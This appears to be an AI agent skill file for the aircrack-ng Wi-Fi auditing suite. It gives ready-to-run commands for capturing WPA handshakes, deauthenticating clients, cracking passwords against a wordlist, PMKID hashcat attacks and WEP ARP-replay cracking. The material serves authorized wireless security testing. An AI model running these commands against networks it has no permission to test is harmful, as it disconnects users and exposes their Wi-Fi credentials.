---
name: aircrack-ng
description: "802.11 WEP/WPA/WPA2 auditing suite — capture handshakes, perform deauth attacks, and crack Wi-Fi passwords. Use when assessing wireless network security or recovering Wi-Fi credentials."
license: MIT
compatibility: "C; Linux; apt install aircrack-ng; requires wireless adapter with monitor mode"
metadata:
  author: AeonDave
  version: "1.0"
---

# Aircrack-ng

802.11 wireless auditing suite — WEP/WPA/WPA2 capture and crack.

## Quick Start

```bash
apt install aircrack-ng

# 1. Enable monitor mode
airmon-ng start wlan0    # Creates wlan0mon

# 2. Discover networks
airodump-ng wlan0mon

# 3. Capture target handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth client (separate terminal) to force handshake
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 5. Crack WPA handshake
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

## Tool Suite

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Monitor mode management |
| `airodump-ng` | Packet capture / AP discovery |
| `aireplay-ng` | Packet injection / deauth |
| `aircrack-ng` | WEP/WPA cracking |
| `airdecap-ng` | Decrypt captured traffic |
| `airgraph-ng` | Visualize network topology |

## Common Workflows

**WPA PMKID attack (no client needed):**
```bash
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
hcxpcapngtool pmkid.pcapng -o hashes.22000
hashcat -m 22000 hashes.22000 rockyou.txt
```

**WEP crack:**
```bash
airodump-ng -c 11 --bssid BSSID -w wep wlan0mon
aireplay-ng -3 -b BSSID wlan0mon   # ARP replay
aircrack-ng wep-01.cap              # Auto-cracks when enough IVs
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | PMKID workflow and adapter compatibility |
